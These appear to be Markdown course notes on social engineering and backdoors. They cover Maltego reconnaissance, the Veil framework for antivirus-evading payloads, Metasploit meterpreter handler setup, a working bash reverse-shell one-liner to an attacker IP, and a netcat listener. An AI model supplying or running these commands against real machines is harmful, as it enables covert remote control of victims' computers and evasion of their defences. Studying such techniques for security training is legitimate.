# Social Engineering

Social Engineering is the art of manupulating people.

* Hacking target through people.
* target can be: person, company, website etc.
* __Big companiese spend a lot of time and money securing their systems__
* But these systems are managed and used by humans
* Not much is spent on educating employees.

## Information Gathering

* Gather information about target(company/website/person).
* Discover associated webstites,links, companies.
* Associated people, names, emails, phone numbers, social networks, friends.
* Associated social networking accounts.
* display all info on a graph and build attack strategies.

* **maltego** : Best tool for information gathering.

https://www.maltego.com/downloads/

## Backdoor

A backdoor is a file that gives full control over the machine that it gets executed on.
Backdoors can be caught. **Veil** is a framework for generating **Undetectable** backdoors.

https://github.com/Veil-Framework/Veil.git

### Veil - backdoor framework for windows

#### Commands

* **exit** : Completely exit Veil
* **info** : Information on a specific tool
* **list** : List available tools
* **options** : Show Veil configuration
* **update** : Update Veil
* **use** : Use a specific tool

#### Tools

* **Evasion** : Generates undetectable backdoors.  
* **Ordnance** : Generates payloads that used by **Evasion**. A payload is the part of the code of the backdoor that does the evil stuff. It gives us reverse connection, download and execute something on the target computer.

### Veil-Evasion

#### Commands

* **back** : Go to Veil's main menu
* **checkvt** : Check VirusTotal.com against generated hashes
* **clean** : Remove generated artifacts
* **exit** : Completely exit Veil
* **info** : Information on a specific payload
* **list** : List available payloads
* **use** : Use a specific payload

#### Payloads

* **meterpreter** : this payload is designed by **metasploit**. **metasploit** is a huge framework for hacking. The cool thing about **meterpreter** is it runs into memory and it allows us to migrate between system processes so we can have the payload or the backdoor running from a normal process like Explorer for example & this payload will allow us to gain full control over the target computer.

#### Payload: 15) go/meterpreter/rev_https

* **LHOST** : IP of the Metasploit handler. This is the main option. This is the IP address which you're going to be receiving the connections on.
* **LPORT** : Port of the Metasploit handler. 8080 or 80 is less suspicious port.
* **PROCESSORS** : Optional: Minimum number of processors. This is used to look malware different so that it can bypass anti-virus.
* **SLEEP** : Optional: Sleep "Y" seconds, check if accelerated. The malware will sleep for given amount of time before injecting the payload.

Backdoor doesn't open a port in the target machine, rather it actually connects from the target computer to the hacker's computer & by doing that it will bypass firewalls. So we need to open port 8080 or 80 in our machine. **metasploit** framework will be used to listen to this port.

### Metasploit - A huge framework for hacking

This will be used for our backdoor because meterpreter & evasion is also based on metasploit.

```bash
    msfconsole      # running metasploit in terminal
```

#### Modules

**exploit/multi/handler** : This module will allow us to listen to a port.

```bash
    use exploit/multi/handler
```

Then we need to set type of our payload.

```bash
    set PAYLOAD windows/meterpreter/reverse_https   # for windows
```

### Linux machine

Creating a backdoor for linux machine is very simple as it runs on UNIX system thus has bash terminal.

```bash
    # backdoor
    bash -i >& /dev/tcp/192.168.0.106/8080 0>&1

    # ip is for hackers machine
    # this script will run on target/victim machine.
```

Hacker's machine should be listening to the port 8080. To do that runs the following command using ***netcat**.

```bash
    nc -vv -l -p 8080
```

* nc = meaning **netcat**
* -vv = it means verbose standard output.
* -p = port
* -l = listen